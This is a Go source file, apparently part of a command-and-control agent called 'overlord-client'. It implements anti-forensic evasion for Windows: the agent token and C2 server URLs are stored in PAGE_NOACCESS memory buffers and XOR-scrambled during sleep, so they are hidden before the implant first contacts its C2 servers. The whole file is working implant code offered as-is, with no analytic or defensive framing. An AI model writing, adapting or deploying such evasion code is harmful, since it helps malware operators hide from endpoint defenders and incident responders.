//go:build windows
// +build windows

package main

import (
	"overlord-client/cmd/agent/config"
	"overlord-client/cmd/agent/evasion"
)

// sensitiveConfigBufs keeps the ProtectedBuf allocations alive for the
// lifetime of the process so the GC never reclaims them.
var sensitiveConfigBufs []*evasion.ProtectedBuf

// protectSensitiveConfig wraps AgentToken and each ServerURL in a
// ProtectedBuf (PAGE_NOACCESS at rest) and also registers the backing bytes
// with RegisterSensitiveRegion so they are XOR-obfuscated during every sleep.
//
// Called once after config.Load() so sensitive strings are protected before
// the first C2 connection attempt.
func protectSensitiveConfig(cfg *config.Config) {
	protect := func(s string) {
		if s == "" {
			return
		}
		buf := evasion.NewProtectedBuf(len(s))
		if buf == nil {
			return
		}
		buf.Set([]byte(s))
		sensitiveConfigBufs = append(sensitiveConfigBufs, buf)

		// Also register a plain []byte copy with the XOR sleep obfuscator so
		// that the data is scrambled on every obfuscated sleep.
		plain := []byte(s)
		evasion.RegisterSensitiveRegion(plain)
	}

	protect(cfg.AgentToken)
	for _, url := range cfg.ServerURLs {
		protect(url)
	}
	if cfg.RawServerListURL != "" {
		protect(cfg.RawServerListURL)
	}
}
